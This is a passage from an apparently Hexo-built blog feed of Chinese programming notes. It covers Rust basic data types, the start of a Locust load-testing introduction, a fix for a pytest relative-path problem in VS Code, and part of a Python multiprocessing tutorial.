class="hljs-comment">// f32</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数字运算"><a href="#数字运算" class="headerlink" title="数字运算"></a>数字运算</h3><p>Rust 的所有数字类型都支持基本数学运算：加法、减法、乘法、除法和取模运算。整数除法会向下取整。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// addition</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">sum</span> = <span class="hljs-number">5</span> + <span class="hljs-number">10</span>;<br><br>    <span class="hljs-comment">// subtraction</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">difference</span> = <span class="hljs-number">95.5</span> - <span class="hljs-number">4.3</span>;<br><br>    <span class="hljs-comment">// multiplication</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">product</span> = <span class="hljs-number">4</span> * <span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// division</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">quotient</span> = <span class="hljs-number">56.7</span> / <span class="hljs-number">32.2</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">floored</span> = <span class="hljs-number">2</span> / <span class="hljs-number">3</span>; <span class="hljs-comment">// Results in 0</span><br><br>    <span class="hljs-comment">// remainder</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">remainder</span> = <span class="hljs-number">43</span> % <span class="hljs-number">5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>和大多数编程语言一样，Rust 中的布尔类型也有两个可能的值：<code>true</code> 和 <code>false</code>。布尔值的大小为 1 个字节。Rust 中的布尔类型使用 <code>bool</code> 声明。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">t</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">f</span>: <span class="hljs-type">bool</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">// with explicit type annotation</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><p>Rust 的 <code>char</code>（字符）类型是该语言最基本的字母类型，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">c</span> = <span class="hljs-string">&#x27;z&#x27;</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">z</span> = <span class="hljs-string">&#x27;ℤ&#x27;</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">heart_eyed_cat</span> = &#x27;😻&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意，我们声明的 <code>char</code> 字面量采用单引号括起来，这与字符串字面量不同，字符串字面量是用双引号括起来。</p><p>Rust 的字符类型大小为 4 个字节，表示的是一个 Unicode 标量值，这意味着它可以表示的远远不止是 ASCII。</p><p>标音字母，中文&#x2F;日文&#x2F;韩文的文字，emoji，还有零宽空格(zero width space)在 Rust 中都是合法的字符类型。</p><p>Unicode 值的范围为 <code>U+0000</code> ~ <code>U+D7FF</code> 和 <code>U+E000</code>~&#96;U+10FFFF&#96;。</p><p>不过“字符”并不是 Unicode 中的一个概念，所以人在直觉上对“字符”的理解和 Rust 的字符概念并不一致。</p><h3 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h3><p><strong>复合类型</strong>（<em>compound type</em>）可以将多个值组合成一个类型。Rust 有两种基本的复合类型：元组（tuple）和数组（array）</p><h3 id="元组类型"><a href="#元组类型" class="headerlink" title="元组类型"></a>元组类型</h3><p>元组是将多种类型的多个值组合到一个复合类型中的一种基本方式。元组的长度是固定的：声明后，它们就无法增长或缩小。</p><p>我们通过在小括号内写入以逗号分隔的值列表来创建一个元组。</p><p>元组中的每个位置都有一个类型，并且元组中不同值的类型不要求是相同的。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tup</span>: (<span class="hljs-type">i32</span>, <span class="hljs-type">f64</span>, <span class="hljs-type">u8</span>) = (<span class="hljs-number">500</span>, <span class="hljs-number">6.4</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">//变量 `tup` 绑定到整个元组，</span><br>&#125;<br></code></pre></td></tr></table></figure><p>因为元组被认作是单个复合元素。 想从元组中获取个别值，我们可以使用模式匹配来<strong>解构</strong>（destructure）元组的一个值，如下所示：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tup</span> = (<span class="hljs-number">500</span>, <span class="hljs-number">6.4</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//变量 `tup` 绑定到整个元组，</span><br><br>    <span class="hljs-keyword">let</span> (x, y, z) = tup; <span class="hljs-comment">// 用对应的3个变量去接收它,</span><br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);<br>    <span class="hljs-comment">// 这里注意报错提醒你x和z是未使用的变量，前面加_就可以</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将这个元组分解成三个单独的变量x、y、z，这个过程称为解构</p><p>除了通过模式匹配进行结构外，还可以通过使用一个句点（.）连上要访问的值的<strong>索引</strong>来直接访问元组元素（类似Python下标索引取值），代码示例:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>: (<span class="hljs-type">i32</span>, <span class="hljs-type">f64</span>, <span class="hljs-type">u8</span>) = (<span class="hljs-number">500</span>, <span class="hljs-number">6.4</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">five_hundred</span> = x.<span class="hljs-number">0</span>; <span class="hljs-comment">// 下标索引为 0 的值</span><br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">six_point_four</span> = x.<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">one</span> = x.<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有任何值的元组<code>()</code>是一种特俗的类型，只有一个值，也可以写成<code>()</code>。该类型被称为<strong>单元类型（unit type）</strong>，该值也被称为<strong>单元值（unit value）</strong>。如果表达式不返回任何其他值，就隐式地返回单元值。</p><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>数组：将多个值组合在一起的另一种方式就是<strong>数组（array）</strong>。与元组不同，数组内的每个元素必须是<strong>同样类型</strong>的元素，</p><p>长度：Rust语言的数组是固定长度的。</p><p>表达形式：方括号内逗号分隔</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span>  = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li><p>当你希望将数据分配到<strong>栈（stack）</strong>而不是<strong>堆（heap）</strong>时，或者希望确保始终具有固定数量的元素时，数组就特别有用。</p></li><li><p>但它不像<strong>vector</strong>（中文翻译为“向量”，Rust中的意义为“动态数据、可变数组”）类型那么灵活。</p></li><li><p>vector 类型类似于标准库中提供的集合类型，其大小<strong>允许</strong>增长或缩小。</p></li><li><p>如果不确定是使用数组还是 vector，那就应该使用一个 vector。</p></li><li><p>不过当你明确元素数量不需要改变时，数组会更有用。例如，如果你在程序中使用月份的名称，你很可能希望使用的是数组而不是 vector，因为你知道它始终包含 12 个元素：</p></li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">months</span> = [<span class="hljs-string">&quot;January&quot;</span>, <span class="hljs-string">&quot;February&quot;</span>, <span class="hljs-string">&quot;March&quot;</span>, <span class="hljs-string">&quot;April&quot;</span>, <span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;June&quot;</span>, <span class="hljs-string">&quot;July&quot;</span>,<br>              <span class="hljs-string">&quot;August&quot;</span>, <span class="hljs-string">&quot;September&quot;</span>, <span class="hljs-string">&quot;October&quot;</span>, <span class="hljs-string">&quot;November&quot;</span>, <span class="hljs-string">&quot;December&quot;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>使用方括号编写数组的类型，其中包含每个元素的类型、分号，然后是数组中的元素数，如下所示：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">5</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]; <span class="hljs-comment">// i32整型，5个元素</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以这种方式编写数组的类型看起来类似于初始化数组的另一种语法：如果要为每个元素创建包含相同值的数组，可以指定初始值，后跟分号，然后在方括号中指定数组的长度，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = [<span class="hljs-number">3</span>; <span class="hljs-number">5</span>]; <span class="hljs-comment">// 5个3 等于 [3,3,3,3,3]</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="访问数组内元素"><a href="#访问数组内元素" class="headerlink" title="访问数组内元素"></a>访问数组内元素</h3><p>数组是可以在栈上分配的已知固定大小的单个内存块。可以使用索引访问数组的元素，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">first</span> = a[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 获取第一个值</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">second</span> = a[<span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2>]]></content>
    
    
    <categories>
      
      <category>rust</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>rust</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python库之locust</title>
    <link href="/2024/05/07/691python%E5%BA%93%E5%AD%A6%E4%B9%A0%E4%B9%8Blocust/"/>
    <url>/2024/05/07/691python%E5%BA%93%E5%AD%A6%E4%B9%A0%E4%B9%8Blocust/</url>
    
    <content type="html"><![CDATA[<h1 id="locust-库简介"><a href="#locust-库简介" class="headerlink" title="locust 库简介"></a>locust 库简介</h1><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>1、python版本大于3.9 </p><p>2、安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip install locust</span><br></code></pre></td></tr></table></figure><p>3、验证版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">locust -V</span><br>locust 2.27.0 from /usr/local/lib/python3.10/site-packages/locust (python 3.10.6)<br></code></pre></td></tr></table></figure><h2 id="第一个测试"><a href="#第一个测试" class="headerlink" title="第一个测试"></a>第一个测试</h2><p>Locust 测试本质上只是一个向你要测试的系统发出请求的 Python 程序。</p><p>这使得它非常灵活，特别擅长实现复杂的用户流程。但它也可以做简单的测试，所以让我们从这里开始：</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次因为在项目中使用相对路径引发的血案</title>
    <link href="/2024/04/10/909vscodeError/"/>
    <url>/2024/04/10/909vscodeError/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次因为在项目中使用相对路径引发的血案"><a href="#记一次因为在项目中使用相对路径引发的血案" class="headerlink" title="记一次因为在项目中使用相对路径引发的血案"></a>记一次因为在项目中使用相对路径引发的血案</h1><p>因为在项目中随手写了一个with open 相对路径 </p><p>原代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># with open(&quot;./test_fixed_new.yml&quot;, &#x27;r&#x27;) as data:</span><br><span class="hljs-comment">#     test_fixed_new = yaml.safe_load(data)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_study</span>():<br>    <span class="hljs-built_in">print</span>(test_fixed_new)<br></code></pre></td></tr></table></figure><p>使用pycharm 时没事，测试用例旁边的箭头也出来了，运行也没有问题</p><p><img src="/../img/other/error11.png" alt="error11"></p><p>vs code 没有 ​​</p><p><img src="/../img/other/no1.png" alt="nill"></p><p>“测试”插件里面也还是啥都没​​​</p><p><img src="/../img/other/error1.png" alt="error1"></p><p>然后接下来就是各种报错 ​​</p><p><img src="/../img/other/error2.png" alt="error2"></p><p>报错​​​​​​</p><p><img src="/../img/other/error3.png" alt="error3"></p><p>报错！</p><p><img src="/../img/other/error4.png" alt="error4"></p><p>还是报错</p><p><img src="/../img/other/error5.png" alt="error5"></p><p>各种报错</p><p><img src="/../img/other/error6.png" alt="error6"></p><p>网上各种搜索查找 –》没用</p><p><img src="/../img/other/baidu.png" alt="baidu"></p><p>实在没法，思维局限了，​​​​​​</p><hr><p>请大佬出马帮忙看一下:</p><p>分两步解决:</p><p>第一步，在<code>pytest.ini</code>配置文件里加<code>-s</code></p><p>pycharm不需要手动在<code>pytest.ini</code>里加<code>-s</code>是不影响运行的</p><p>vscode 必须要加</p><p><img src="/../img/other/s.png" alt="s"></p><p>出来鸟</p><p><img src="/../img/other/success1.png" alt="s"></p><p>还是有两个报错，继续解决</p><p>找不到文件 </p><p><img src="/../img/other/error8.png" alt="error8"></p><p>继续找不到文件</p><p><img src="/../img/other/error9.png" alt="error9"></p><p>路径改一下，不要用相对路径 –》完事儿 OK了</p><p><img src="/../img/other/success3.png" alt="success3"></p><p>修改后代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 原来的</span><br><span class="hljs-comment"># with open(&quot;./test_fixed_new.yml&quot;, &#x27;r&#x27;) as data:</span><br><span class="hljs-comment">#     test_fixed_new = yaml.safe_load(data)</span><br><br><br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-comment"># 现在的</span><br>current_dir = Path.cwd()  <span class="hljs-comment"># 获取当前项目的根目录current working directory工作目录</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;current_dir=<span class="hljs-subst">&#123;current_dir&#125;</span>&quot;</span>)<br>file_path = current_dir / <span class="hljs-string">&quot;cases&quot;</span> / <span class="hljs-string">&quot;fixed&quot;</span> / <span class="hljs-string">&quot;test_fixed_new.yml&quot;</span>  <span class="hljs-comment"># 拼接文件目录</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> data:<br>    test_fixed_new = yaml.safe_load(data)<br>    <span class="hljs-built_in">print</span>(test_fixed_new)<br><br></code></pre></td></tr></table></figure><p>结束​​</p><p><img src="/../img/spacex-OHOU-5UVIYQ-unsplash.jpg" alt="NICE"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之并发编程（七）</title>
    <link href="/2024/03/20/607python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <url>/2024/03/20/607python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="7-并发编程"><a href="#7-并发编程" class="headerlink" title="7 并发编程"></a>7 并发编程</h1><p>并发编程的目的：提高程序处理任务，处理请求的速度&#x2F;能力。</p><p>并发编程的方式：</p><ul><li>多进程</li><li>多线程</li><li>协程</li></ul><h2 id="7-1-开启多进程的两种方式"><a href="#7-1-开启多进程的两种方式" class="headerlink" title="7-1 开启多进程的两种方式"></a>7-1 开启多进程的两种方式</h2><ul><li><p>程序仅仅只是一堆代码而已，而进程指的是程序的运行过程。</p></li><li><p>需要强调的是：<strong>同一个程序执行两次，那就是两个进程</strong></p></li></ul><p>方式1：Process</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is start&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is done&#x27;</span>)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 创建一个子进程, windows下只能使用这种方式，否则报错</span><br>    p = Process(target=func, args=(<span class="hljs-string">&#x27;jack&#x27;</span>,))<br>    <span class="hljs-comment"># 开启子进程</span><br>    p.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br></code></pre></td></tr></table></figure><p>方式2：继承Process， 重写方法run</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is start&#x27;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is done&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcess</span>(<span class="hljs-title class_ inherited__">Process</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):  <span class="hljs-comment"># start会自动调用run</span><br>        func(self.name)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = MyProcess(<span class="hljs-string">&quot;jack&quot;</span>)<br>    p.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="7-2-主进程等待子进程结束"><a href="#7-2-主进程等待子进程结束" class="headerlink" title="7-2 主进程等待子进程结束"></a>7-2 主进程等待子进程结束</h2><p>示例1：使用<code>join()</code>优雅的等待子进程结束，不要使用<code>time.sleep</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is start&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is done&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = Process(target=func, args=[<span class="hljs-string">&#x27;jack&#x27;</span>])<br>    p.start()<br>    p.join(timeout=<span class="hljs-number">1</span>)        <span class="hljs-comment"># time.sleep(10)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br>    <br>    <br>    <span class="hljs-comment"># p.join(timeout=1)timeout设置等待时间</span><br></code></pre></td></tr></table></figure><p>示例2：等待多个子进程，使用不当造成串行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is start&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> is done&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p = Process(target=func, args=[<span class="hljs-built_in">str</span>(i)])<br>        p.start()<br>        p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br></code></pre></td></tr></table></figure><p>示例3：示例2优化版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    ps = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p = Process(target=func, args=[<span class="hljs-built_in">str</span>(i)])<br>        p.start()<br>        ps.append(p)<br>        <br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ps:<br>        p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br></code></pre></td></tr></table></figure><p>示例4：等待总耗时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> is start&#x27;</span>)<br>    time.sleep(i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> is done&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    ps = []<br>    start = time.time()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>):<br>        p = Process(target=func, args=[i])<br>        p.start()<br>        ps.append(p)<br><br>    <span class="hljs-keyword">for</span> p <span 